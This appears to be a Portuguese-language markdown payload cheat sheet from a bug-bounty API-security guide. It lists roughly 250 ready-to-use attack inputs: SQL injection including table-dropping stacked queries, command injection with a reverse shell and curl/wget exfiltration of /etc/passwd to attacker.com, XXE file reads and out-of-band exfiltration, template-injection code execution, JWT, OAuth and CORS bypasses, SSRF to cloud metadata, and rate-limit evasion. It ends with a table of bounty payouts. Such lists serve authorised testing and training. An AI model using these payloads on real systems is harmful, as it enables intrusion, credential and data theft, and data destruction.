# 💾 PAYLOAD DATABASE - 250+ Payloads para APIs

REST, GraphQL, gRPC, WebSocket, OAuth, JWT

---

# 🔴 REST API PAYLOADS (50+)

## BOLA/IDOR

```
GET /api/users/1
GET /api/users/0
GET /api/users/-1
GET /api/users/999999
GET /api/users/admin
GET /api/users/root
GET /api/users/me
GET /api/users/all
GET /api/users/*
GET /api/users/~
GET /api/users/..
```

## Authentication Bypass

```
# Sem token
GET /api/admin

# Token vazio
Authorization: Bearer ""
Authorization: Bearer null
Authorization: Bearer undefined

# Token inválido
Authorization: Bearer invalid
Authorization: Bearer test
Authorization: Bearer 123

# Method override
X-HTTP-Method-Override: GET
X-Original-URL: /api/admin
X-Rewrite-URL: /api/admin

# Headers alternativos
Authorization-Token: xxx
X-Auth-Token: xxx
X-API-Key: xxx
```

## Parameter Fuzzing

```
?id=1
?user_id=1
?admin=true
?role=admin
?is_admin=1
?bypass=true
?debug=1
?test=1
?dev=1
?internal=1
```

---

# 🟢 SQL INJECTION (40+)

## Clássico

```
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin' #
admin'/*
' or 'a'='a
```

## UNION-based

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT @@version--
' UNION SELECT table_name FROM information_schema.tables--
```

## Blind SQLi

```
' AND '1'='1
' AND '1'='2
' AND 1=1--
' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' OR 1=1 WAITFOR DELAY '00:00:05'--
```

## Time-based

```
' AND SLEEP(5)--
' OR SLEEP(5)--
' UNION SELECT SLEEP(5)--
' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--
```

## Stacked Queries

```
'; DROP TABLE users--
'; INSERT INTO users VALUES ('admin','admin')--
'; UPDATE users SET admin=1 WHERE id=1--
```

---

# 🟡 COMMAND INJECTION (30+)

## Shell Commands

```
; whoami
| whoami
` whoami `
$(whoami)
; id
; cat /etc/passwd
; ls -la
| nc attacker.com 1234
; bash -i >& /dev/tcp/attacker.com/1234 0>&1
```

## Blind Exfiltration

```
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?$(cat /etc/passwd)
```

---

# 🔵 XXE (25+)

## File Reading

```
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## Blind XXE

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root>&exfil;</root>
```

## OOB Exfiltration

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
```

---

# 🟠 SSTI (30+)

## Jinja2/Django

```
{{ 7*7 }}
{{ "7"*7 }}
{{ [].__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate() }}
{{ config.items() }}
{{ self.__dict__.__str__() }}
```

## Velocity

```
#set($x=0)
#foreach($i in [1..$TargetObject.size()])
#set($x=$i)
#end
$x

#set($rt = @java.lang.Runtime@getRuntime())
$rt.exec('whoami')
```

## FreeMarker

```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
```

---

# 🟣 GRAPHQL (35+)

## Introspection

```
{
  __schema {
    types {
      name
      fields { name type }
    }
  }
}
```

## N+1 Attack

```
{
  users {
    posts {
      comments {
        author {
          friends {
            posts {
              comments { text }
            }
          }
        }
      }
    }
  }
}
```

## Query Complexity DoS

```
query {
  a: user { id }
  b: user { id }
  c: user { id }
  ...
  (repetir 1000x)
}
```

## Authentication Bypass

```
mutation {
  login(username: "admin", password: "wrongpass") {
    token
  }
}

query {
  admin {
    users { email }
  }
}
```

---

# 🔶 WEBSOCKET (20+)

## Unvalidated Messages

```json
{
  "action": "admin_delete",
  "user_id": 1
}

{
  "type": "update_profile",
  "is_admin": true
}

{
  "command": "execute",
  "cmd": "whoami"
}
```

---

# 🟠 OAUTH (20+)

## Redirect URI Bypass

```
?redirect_uri=http://attacker.com
?redirect_uri=http://attacker.com/
?redirect_uri=http://app.com.attacker.com
?redirect_uri=http://app.com@attacker.com
?redirect_uri=http://localhost
?redirect_uri=http://127.0.0.1
?redirect_uri=javascript:alert('XSS')
```

## State Parameter Bypass

```
# Sem state
GET /authorize?client_id=xxx&response_type=code

# State vazio
&state=

# State previsível
&state=1
&state=admin
```

## Scope Elevation

```
?scope=read
?scope=read write
?scope=read write admin
?scope=*
```

---

# 🟡 JWT (25+)

## Algorithm Confusion

```
# Mudar de RS256 para HS256
{"alg":"HS256"}

# Algorithm "none"
{"alg":"none"}

# Typos
{"alg":"hs256"}  # lowercase
{"alg":"RS256  "}  # space
```

## Secret Bruteforce

```
password
123456
secret
key
admin
test
jwt
token
supersecret
changeme
```

## Claims Injection

```
{"role":"admin"}
{"is_admin":true}
{"superuser":1}
{"admin":true}
{"permissions":["*"]}
{"iat": (past date)}
{"exp": (future date)}
```

## Kid Injection

```
{"kid":"../../etc/passwd"}
{"kid":"test' OR '1'='1"}
```

---

# 🔴 CORS (15+)

## Bypass Attempts

```
Origin: http://attacker.com
Origin: http://localhost
Origin: http://127.0.0.1
Origin: http://app.com.attacker.com
Origin: null

Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# Credentials com wildcard
```

---

# 🟢 SSRF (20+)

## Internal Services

```
http://localhost:8080
http://127.0.0.1:8080
http://169.254.169.254 (AWS metadata)
http://169.254.169.254/latest/meta-data/
http://internal-service.local
http://admin.internal
http://db.local:5432
http://redis.local:6379
```

## Port Scanning

```
http://localhost:22
http://localhost:80
http://localhost:443
http://localhost:3306 (MySQL)
http://localhost:5432 (PostgreSQL)
http://localhost:27017 (MongoDB)
http://localhost:6379 (Redis)
```

---

# 🟡 BOTA (Broken Object-Oriented Authentication)

```
{
  "id": 1,
  "admin": true,
  "role": "administrator"
}

{
  "user_id": 1,
  "permissions": ["delete", "create", "admin"]
}

{
  "level": 999,
  "privilege": "superadmin"
}
```

---

# 🔵 RATE LIMIT BYPASS

```
# Different headers
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: attacker.com
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1

# Método alternativo
GET /login
POST /login  (pode ter limite diferente)

# Delay
sleep 1 entre requisições
```

---

# 📊 RESUMO DE PAYLOADS

| Tipo | Quantidade | Risco | Recompensa |
|---|---|---|---|
| REST BOLA | 50+ | Alto | $500-5K |
| SQL Injection | 40+ | Crítico | $1K-10K |
| Command Injection | 30+ | Crítico | $2K-10K |
| XXE | 25+ | Alto | $500-2K |
| SSTI | 30+ | Crítico | $1K-5K |
| GraphQL | 35+ | Alto | $500-5K |
| WebSocket | 20+ | Médio | $200-1K |
| OAuth | 20+ | Alto | $1K-5K |
| JWT | 25+ | Alto | $500-3K |
| CORS | 15+ | Médio | $200-1K |
| SSRF | 20+ | Alto | $500-2K |

**Total: 250+ payloads prontos para usar! 🎯**

---

**Próximo:** Volte para [API-SECURITY-MASTER-README.md](./API-SECURITY-MASTER-README.md)

